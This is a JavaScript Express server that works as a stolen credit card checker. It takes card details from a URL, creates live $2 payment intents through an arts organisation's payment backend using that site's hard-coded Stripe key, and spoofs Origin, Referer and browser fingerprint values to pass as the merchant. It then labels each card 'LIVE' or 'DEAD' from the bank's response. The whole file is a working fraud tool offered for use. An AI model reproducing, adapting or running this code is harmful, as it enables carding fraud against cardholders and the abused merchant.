const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());

// --- ARTPAN CONFIG ---
const ARTPAN_PK = 'pk_live_51QVIZEBQDKIMdEl0TH6zoYwCH8E5Q1XyxJ73HNSqz7kWQUDPelsHHplSQnRUDzQGkoC2PtEqKqhgT9pkltge0jaB00C63zAYQm';
const ARTPAN_INTENT_API = 'https://us-central1-artspanapp.cloudfunctions.net/createPaymentIntent';

// IDs that mimic real browser fingerprints
const genID = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
    const r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
});

app.get('/chk', async (req, res) => {
    const cardParam = req.query.card;
    if (!cardParam) return res.send('❌ Usage: /chk?card=num|mm|yyyy|cvv');

    const [num, mon, year, cvv] = cardParam.split('|').map(i => i.trim());
    const fullYear = year.length === 2 ? `20${year}` : year;

    try {
        // 1. GET CLIENT SECRET
        const intentRes = await axios.post(ARTPAN_INTENT_API, {
            amount: 200,
            email: `user${Math.floor(Math.random()*999)}@gmail.com`,
            live: true
        });
        const secret = intentRes.data.clientSecret;
        const pi_id = secret.split('_secret')[0];

        // 2. CREATE PAYMENT METHOD (The Bypass Step)
        // We use the 'payment_methods' endpoint which is less restricted
        const pmRes = await axios.post('https://api.stripe.com/v1/payment_methods', 
            new URLSearchParams({
                'type': 'card',
                'card[number]': num,
                'card[cvc]': cvv,
                'card[exp_month]': parseInt(mon),
                'card[exp_year]': parseInt(fullYear),
                'key': ARTPAN_PK,
                'guid': genID(),
                'muid': genID(),
                'sid': genID(),
            }).toString(),
            {
                headers: {
                    'Origin': 'https://js.stripe.com',
                    'Referer': 'https://www.artspan.org/', // SPOOFED AUTHORIZED DOMAIN
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                }
            }
        ).catch(e => e.response);

        if (pmRes.data.error) {
            return res.send(`<h2>❌ Surface Blocked</h2><p>${pmRes.data.error.message}</p>`);
        }

        const pm_id = pmRes.data.id;

        // 3. CONFIRM THE PAYMENT
        const confirmRes = await axios.post(`https://api.stripe.com/v1/payment_intents/${pi_id}/confirm`, 
            new URLSearchParams({
                'payment_method': pm_id, // We use the ID, not raw data
                'client_secret': secret,
                'key': ARTPAN_PK
            }).toString(),
            {
                headers: {
                    'Origin': 'https://www.artspan.org',
                    'Referer': 'https://www.artspan.org/'
                }
            }
        ).catch(e => e.response);

        // --- DISPLAY RESULT ---
        const data = confirmRes.data;
        const isLive = data.status === 'succeeded' || (data.error && data.error.decline_code === 'insufficient_funds');
        
        res.send(`
            <div style="font-family:sans-serif; text-align:center; margin-top:50px;">
                <h1 style="color:${isLive ? 'green' : 'red'};">${isLive ? '✅ LIVE' : '❌ DEAD'}</h1>
                <p><b>Bank Response:</b> ${data.error ? data.error.message : 'Success'}</p>
                <p><b>Decline Code:</b> ${data.error ? (data.error.decline_code || 'generic_decline') : 'success'}</p>
            </div>
        `);

    } catch (err) {
        res.status(500).send(`Error: ${err.message}`);
    }
});

app.listen(PORT, () => console.log(`Bypass active on ${PORT}`));
